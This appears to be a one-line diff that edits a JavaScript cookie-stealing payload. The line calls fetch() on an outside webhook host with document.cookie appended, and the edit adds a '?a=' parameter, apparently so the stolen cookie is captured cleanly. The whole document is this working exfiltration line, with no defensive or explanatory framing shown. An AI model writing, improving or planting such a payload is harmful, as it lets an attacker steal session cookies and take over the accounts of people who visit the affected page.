@@ -1,1 +1,1 @@
-fetch('https://noble-hawk-79.webhook.cool' + document.cookie);
+fetch('https://noble-hawk-79.webhook.cool?a=' + document.cookie);
